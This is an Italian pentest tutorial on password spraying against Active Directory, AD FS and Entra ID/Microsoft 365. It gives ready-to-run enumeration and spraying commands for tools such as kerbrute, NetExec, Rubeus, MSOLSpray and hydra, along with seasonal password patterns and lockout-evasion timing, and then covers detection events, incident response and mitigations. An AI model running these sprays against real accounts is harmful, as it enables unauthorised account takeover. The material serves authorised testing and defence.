---
title: 'Password Spraying : Guida Completa su AD, AD FS ed Entra ID'
slug: password-spraying
description: 'Scopri il password spraying su Active Directory: tecniche, tool per pentest autorizzati, detection e difese contro accessi con password deboli.'
image: /password-spraying-active-directory-password-deboli.webp
draft: true
date: 2026-07-20T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - password spraying
  - active directory
  - credential access
  - entra id
---

# Password Spraying su Active Directory: Accesso Iniziale via Password Deboli

Il password spraying testa una o poche password comuni contro tutti gli account utente del dominio. A differenza del brute force, non supera mai la soglia di lockout — e una sola password debole tra tutti gli utenti è sufficiente per ottenere un foothold autenticato.

***

È una delle tecniche di accesso iniziale più efficaci in ambienti Active Directory perché sfrutta una realtà organizzativa: in qualsiasi dominio con centinaia o migliaia di utenti, statisticamente qualcuno ha impostato una password prevedibile legata al nome azienda o alla stagione. Non servono exploit — basta trovare quel singolo account.

Gruppi APT documentati che usano password spraying regolarmente: Midnight Blizzard via Kerberos su tenant Microsoft 365, Peach Sandstorm contro settore difesa e farmaceutico, gruppi ransomware tramite SharpSpray su AD on-prem.

Classificato da MITRE ATT\&CK come [T1110.003](https://attack.mitre.org/techniques/T1110/003/).

***

## Password Spraying vs Brute Force vs Credential Stuffing

| Tecnica                 | Cosa testa                                    | Volume per account                  | Rischio lockout    |
| ----------------------- | --------------------------------------------- | ----------------------------------- | ------------------ |
| **Password spraying**   | Poche password comuni su molti account        | Basso (1-2)                         | Basso se calibrato |
| **Brute force**         | Molte password su un account                  | Alto                                | Alto               |
| **Credential stuffing** | Coppie username:password già valide da breach | Basso per account, ma già associate | Variabile          |

Password spraying e credential stuffing si assomigliano nel "restare sotto il lockout", ma differiscono nella fonte: lo spraying prova password *indovinate*, lo stuffing usa credenziali *già rubate e associate*. Vedi [credential stuffing](https://hackita.it/articoli/credential-stuffing/) per l'approfondimento.

***

## Regole d'Ingaggio — Prima di Qualsiasi Comando

Un test di password spraying va sempre condotto con un perimetro chiaro concordato col cliente:

* autorizzazione scritta esplicita per l'attività
* esclusione degli account privilegiati e degli account di emergenza (break-glass)
* elenco delle applicazioni/protocolli autorizzati (AD, VPN, OWA, SaaS...)
* numero massimo di tentativi e finestra operativa concordati
* referente cliente raggiungibile durante il test
* stop condition definita in anticipo, con procedura di sblocco account già pronta

Questo perimetro va rispettato indipendentemente dalla tecnica scelta — anche quando si distribuiscono i tentativi su più sorgenti, l'obiettivo resta misurare la resilienza dei controlli concordati, non aggirare intenzionalmente il SOC del cliente al di fuori dell'ambito approvato.

***

## Superfici di Attacco

Password e lockout policy non sono uniformi tra ambienti — vanno trattati separatamente:

1. **AD interno** — Kerberos, LDAP, SMB, NTLM
2. **Servizi esposti** — VPN, RD Gateway, OWA, Citrix, portali aziendali
3. **AD FS** — endpoint federati, Web Application Proxy, Extranet Smart Lockout
4. **Entra ID / Microsoft 365** — Smart Lockout, Conditional Access, Identity Protection
5. **Applicazioni custom** — form web, API, autenticazione mobile

***

## Enumerazione Username

```bash
# Da Linux — enumerazione via RPC
enum4linux-ng -U <DC_IP>
rpcclient -U "" -N <DC_IP> -c "enumdomusers"

# ldapnomnom / LDAP anonymous bind
ldapsearch -x -H ldap://<DC_IP> -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# Kerbrute — valida username senza credenziali (AS-REQ enumeration)
./kerbrute userenum --dc <DC_IP> -d corp.local usernames.txt

# NetExec — lista utenti con credenziali già note
nxc smb <DC_IP> -u utente -p 'password_test' --users
```

Formato username: se non è già noto, va derivato osservando naming convention pubbliche (email aziendali, LinkedIn, metadati di documenti pubblici tramite tool come FOCA) prima di generare la lista. Una lista di username statisticamente plausibili (es. combinazioni iniziali+cognome comuni) può integrare l'enumerazione diretta quando quest'ultima non è praticabile.

***

## SpearSpray — Spraying Policy-Aware

**SpearSpray** merita una menzione a parte perché risolve buona parte dei problemi di calibrazione descritti sopra in modo nativo:

* enumerazione utenti via LDAP con paging (utile su domini grandi; il page size di default è 200, regolabile)
* lettura automatica della domain policy **e** delle PSO (FGPP), con un buffer configurabile di tentativi da lasciare come margine rispetto al `badPwdCount` di ciascun utente
* validazione via Kerberos pre-auth (genera 4768/4771 sui DC, non 4625)
* generazione di password per-utente basata su pattern (nome, cognome, valori temporali derivati dal `pwdLastSet` del singolo utente)
* possibilità di taggare i principal compromessi direttamente in Neo4j per il pathing con BloodHound

Questo tipo di tooling automatizza esattamente il margine di sicurezza descritto in precedenza, invece di lasciarlo a un calcolo manuale.

### legba — spraying multi-protocollo

```bash
legba kerberos --target <DC_IP> --username admin --password wordlists/passwords.txt --kerberos-realm corp.local
```

legba supporta Kerberos oltre a numerosi altri protocolli con un'unica interfaccia a riga di comando.

***

## Policy Risultante — Cosa Verificare Prima di Spruzzare

Verificare solo la Default Domain Policy non basta: le Fine-Grained Password Policies (FGPP) possono applicare soglie diverse a gruppi specifici, e ogni utente può avere già `badPwdCount` accumulato da tentativi indipendenti (login mobile, servizi con credenziali salvate, sincronizzazioni).

```powershell
# Default Domain Policy
net accounts /domain

# PowerView — SystemAccess (Default Domain Policy)
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess

# Fine-Grained Password Policies applicate nel dominio
Get-ADFineGrainedPasswordPolicy -Filter *

# badPwdCount del singolo utente prima di iniziare — evita sorprese
Get-ADUser -Identity jsmith -Properties BadPwdCount, LockedOut
```

```bash
# Via LDAP da Linux
ldapsearch -x -H ldap://<DC_IP> -D "utente@corp.local" -w 'password_test' \
  -b "DC=corp,DC=local" "(objectClass=domain)" \
  lockoutThreshold lockoutObservationWindow lockoutDuration
```

Da tenere presente:

* account privilegiati e service account possono avere FGPP diverse (spesso più severe)
* account con password che non scade mai vanno segnalati come rischio a prescindere dallo spray
* account sincronizzati/federati (AD Connect, ADFS) possono avere comportamento di lockout diverso tra on-prem e cloud

**Margine di sicurezza consigliato:** non calcolare il numero massimo di round come `lockoutThreshold - 1` in automatico. Considerare sempre un margine per tentativi già accumulati altrove, e preferire un solo round per finestra quando non si ha visibilità sul `badPwdCount` di ogni singolo utente.

***

## Password Spraying via Kerberos, LDAP, SMB

### Kerbrute

```bash
./kerbrute passwordspray --dc <DC_IP> -d corp.local users.txt 'PasswordDiTest1!'
```

### NetExec

```bash
# SMB
nxc smb <DC_IP> -u users.txt -p 'PasswordDiTest1!' --no-bruteforce --continue-on-success

# LDAP
nxc ldap <DC_IP> -u users.txt -p 'PasswordDiTest1!' --no-bruteforce --continue-on-success
```

### Talon — rotazione automatica tra protocolli e DC

```bash
Talon_linux_amd64 -H <DC_IP> -D corp.local -Userfile users.txt -P 'PasswordDiTest1!'
```

Talon alterna automaticamente Kerberos e LDAP, e ruota tra più domain controller se forniti — utile per distribuire la telemetria generata, non per "nascondersi" dal SOC.

### Altri tool della stessa famiglia

* **CredMaster** — spray contro endpoint cloud con supporto proxy
* **sprayhound** — wrapper Python su NetExec pensato per spraying calibrato sulla lockout policy
* **conpass** — spraying con gestione automatica della password policy
* **Ruler** — utile in particolare contro OWA/Exchange

```bash
ruler-linux64 --domain corp.local -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
```

### Rubeus — spray via Kerberos

```powershell
.\Rubeus.exe brute /users:users.txt /passwords:passwords.txt /domain:corp.local /outfile:results.txt
```

Il parametro `/delay` non risulta documentato in modo stabile nella versione corrente dello strumento — verificarne la disponibilità nella build in uso prima di affidarcisi per il timing.

### DomainPasswordSpray

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'PasswordDiTest1!' -Verbose
```

Lo script calcola in automatico gli utenti dal dominio e limita i tentativi in base alla password policy rilevata — verificarne comunque il comportamento sulla versione in uso, poiché la gestione del `badPwdCount` ha avuto issue note in passato.

Per escludere gli account disabilitati dal filtro LDAP serve la negazione esplicita:

```powershell
-Filter "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
```

Il filtro senza negazione (`(userAccountControl:1.2.840.113556.1.4.803:=2)`) seleziona invece gli account con il flag `ACCOUNTDISABLE` — cioè li include, non li esclude.

### Password Spraying su Form Web

```bash
hydra -L users.txt -p 'PasswordDiTest1!' https-post-form \
  "//company.com/login:username=^USER^&password=^PASS^:Invalid password" \
  -t 1 -w 30
```

***

## Password da Testare

I pattern stagionali (`Stagione+Anno!`, `NomeAzienda+Anno!`) sono ancora frequenti negli ambienti con policy legacy di scadenza periodica obbligatoria. Questa pratica è oggi sconsigliata sia da NIST che da Microsoft, che raccomandano di non forzare il cambio password periodico senza evidenza di compromissione — motivo per cui, paradossalmente, proprio gli ambienti con policy più "vecchio stile" restano i più prevedibili da testare.

```
NomeAzienda + Anno + simbolo
Stagione + Anno + simbolo
Mese + Anno + simbolo
Password comuni generiche (top 10k)
```

***

## Timing

```
lockoutThreshold = 5
lockoutObservationWindow = 30 minuti

→ margine di sicurezza: 1 round per finestra, non "soglia - 1" calcolata in automatico
→ verificare badPwdCount residuo per gli utenti critici prima di ogni round
```

La differenza tra Kerberos, LDAP, SMB e NTLM non è "più stealth" in senso assoluto, ma **telemetria diversa**: ogni protocollo produce eventi differenti, e un protocollo che evita un evento comunemente monitorato (es. 4625 per NTLM) ne genera comunque altri (es. 4771 per Kerberos) che un SOC maturo osserva ugualmente.

***

## Password Spraying su Ambienti Ibridi — Entra ID e Microsoft 365

In ambienti ibridi, il password spraying colpisce anche i portali cloud, dove le policy possono essere diverse da quelle on-prem.

```powershell
# MSOLSpray — spray su tenant Microsoft 365
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList users.txt -Password 'PasswordDiTest1!' -Verbose
```

Da considerare: molti tenant moderni hanno disabilitato la Basic Authentication su Exchange Online e i flussi legacy tipo Resource Owner Password Credentials (ROPC), oggi deprecati e incompatibili con MFA. Tool storici come MSOLSpray possono quindi avere risultati molto diversi a seconda della configurazione del tenant target — vanno considerati strumenti utili ma dipendenti dal contesto, non universalmente funzionanti.

```bash
# Trevorspray — spray multi-threaded su Microsoft 365
pip install trevorspray
trevorspray -u users.txt -p 'PasswordDiTest1!' --ms-graph
```

**Differenze chiave cloud vs on-prem:**

* Prima di spruzzare, va identificato se il tenant è managed, federated o hybrid: l'endpoint di autenticazione e il comportamento del lockout cambiano di conseguenza
* Entra ID Smart Lockout non incrementa il contatore di lockout se si ripete la stessa password errata — lo incrementa solo quando si prova una password *nuova*; questo cambia il modo in cui va conteggiato un round rispetto al lockout AD tradizionale
* i tenant che usano Pass-Through Authentication (PTA) non beneficiano del tracking degli hash delle password errate lato Microsoft, e vanno quindi trattati come bersagli lockout-sensitive più simili all'AD classico
* Microsoft Entra ID Protection rileva pattern di spray soprattutto quando una password viene validata con successo; i soli tentativi falliti non generano necessariamente una risk detection specifica
* i log cloud (Entra ID Sign-in logs) sono separati dai log AD on-prem — un SOC potrebbe monitorarne solo uno
* gli account federati (AD FS) hanno protezione dedicata: **Extranet Smart Lockout**, pensata per distinguere sorgenti familiari da tentativi ostili sugli account federati

***

## Pattern Distribuiti e Low-and-Slow

Un solo host che testa molti utenti è il pattern più facile da rilevare. Le campagne più evasive usano invece:

* molti indirizzi IP contro molti utenti, pochi tentativi per singola sorgente
* infrastrutture proxy distribuite
* intervalli irregolari tra i tentativi
* stesso pattern ripetuto contro più applicazioni della stessa organizzazione
* campagne che durano giorni invece di minuti

I sistemi di risk detection moderni (Entra ID Protection incluso) correlano pattern su più indirizzi IP e identificatori, non solo il volume da una singola sorgente — motivo per cui la sola distribuzione degli IP non garantisce di restare sotto il radar.

***

## Scenario Pratico in un Pentest Autorizzato

Rete interna, nessuna credenziale iniziale, lista di 500 utenti ottenuta via enumerazione.

```bash
# 1. Verifica lockout policy
ldapsearch -x -H ldap://<DC_IP> -b "DC=corp,DC=local" "(objectClass=domain)" lockoutThreshold
# lockoutThreshold: 5 → margine di sicurezza: un round per finestra

# 2. Primo round, un solo tentativo per utente
./kerbrute passwordspray --dc <DC_IP> -d corp.local users.txt 'PatternStagionale!'
# → Hit su un account

# 3. Con le credenziali ottenute → enumerazione AD
nxc ldap <DC_IP> -u jsmith -p 'PatternStagionale!' --users
```

Un singolo account compromesso apre la porta a enumerazione AD completa, [Kerberoasting](https://hackita.it/articoli/kerberoasting/) e [AS-REP Roasting](https://hackita.it/articoli/as-rep-roasting/).

***

## Detection

**Windows / AD on-prem:**

* **Event ID 4625** — logon fallito, generato sul sistema che riceve il tentativo (non necessariamente sul DC)
* **Event ID 4771** — fallimento pre-autenticazione Kerberos, generato solo sui domain controller quando il KDC non rilascia il TGT (codice `0x18` = credenziali di pre-autenticazione non valide, tipicamente password errata)
* **Event ID 4768** — richiesta TGT, utile per correlare le autenticazioni Kerberos
* **Event ID 4740** — account bloccato, permette di correlare l'effetto del lockout con la sorgente dello spray

Segnali di pattern:

* stesso source IP con fallimenti su decine di account diversi in poco tempo
* timing regolare tra i tentativi (automazione riconoscibile)
* account precedentemente inattivi che iniziano improvvisamente a registrare fallimenti

**AD FS e cloud (separati dal rilevamento AD on-prem):**

* Microsoft Defender for Identity — detection dedicata per Kerberos/NTLM/LDAP on-prem
* Microsoft Entra ID Protection — sign-in risk e user risk, principalmente su credenziali validate con successo
* Microsoft Defender XDR — correlazione cross-workload
* log AD FS dedicati per gli endpoint federati

***

## Incident Response dopo una Credenziale Trovata

1. Contenere o bloccare temporaneamente l'account coinvolto
2. Cambiare la password
3. Revocare sessioni attive e token cloud collegati
4. Verificare metodi MFA registrati di recente e non riconosciuti
5. Controllare regole di inoltro/filtro sulla casella email
6. Cercare login riusciti successivi allo spray, anche su VPN/SaaS/applicazioni interne
7. Cercare movimento laterale a partire dall'account compromesso
8. Verificare se la stessa password è stata riutilizzata da altri account

***

## Mitigazione

* **Fine-Grained Password Policy** — applicare soglie calibrate sul rischio agli account sensibili, evitando soglie così basse (es. 3) da permettere a un attaccante di bloccare deliberatamente gli amministratori; Microsoft indica come riferimento soglie più alte (es. 10) o, in alcuni modelli, nessun lockout accompagnato da controlli compensativi
* **Password ban list** — blocco delle password comuni al cambio password; nativa in cloud, richiede agent dedicati sui DC per l'estensione on-premises
* **MFA, idealmente phishing-resistant (FIDO2/passkey)** — anche con credenziali valide, richiede un secondo fattore
* **Smart Lockout** (Entra ID) ed **Extranet Smart Lockout** (AD FS) — distinguono pattern di spray da accessi legittimi
* **Conditional Access** — blocco o restrizione da paesi/IP non usuali, politiche basate sul rischio
* **Disabilitazione dei metodi di autenticazione legacy** (incluso ROPC) dove non necessari
* Account amministrativi cloud-only separati e protezione degli account di emergenza
* Password uniche per service account, uso di gMSA dove applicabile
* Monitoraggio aggregato di Event ID 4625/4771/4740 per source IP, non soglie fisse isolate

***

## FAQ

**Qual è la differenza tra password spraying e brute force?**
Il brute force testa molte password su un singolo account, rischiando di superare il lockout. Il password spraying testa una o poche password su molti account, restando sotto soglia — l'obiettivo è trovare il singolo account con password debole.

**Posso calcolare in automatico il numero di round come lockoutThreshold - 1?**
Non in modo affidabile. Tentativi già accumulati altrove, FGPP specifiche per utente e differenze tra ambienti rendono più sicuro un margine conservativo, con verifica del `badPwdCount` residuo dove possibile.

**Cosa cambia con Entra ID Smart Lockout rispetto al lockout AD tradizionale?**
Smart Lockout distingue tentativi che sembrano provenire da posizioni/dispositivi familiari da quelli che sembrano ostili, riducendo i falsi positivi rispetto a un lockout puramente basato sul conteggio dei fallimenti.

***

## Conclusione

Il password spraying rimane uno dei vettori di accesso iniziale più efficaci in AD perché sfrutta un problema umano che nessuna patch risolve: le persone scelgono password prevedibili. In un engagement, trovare un solo account con password debole apre la porta a tutta la catena di post-exploitation. La difesa richiede più livelli in parallelo: password ban list, lockout policy calibrata per contesto (non soglie fisse universali), MFA resistente al phishing, e monitoring che copra sia gli eventi Windows on-prem sia i log cloud/AD FS separatamente.

***

**Risorse:**

* [MITRE ATT\&CK – T1110.003](https://attack.mitre.org/techniques/T1110/003/)
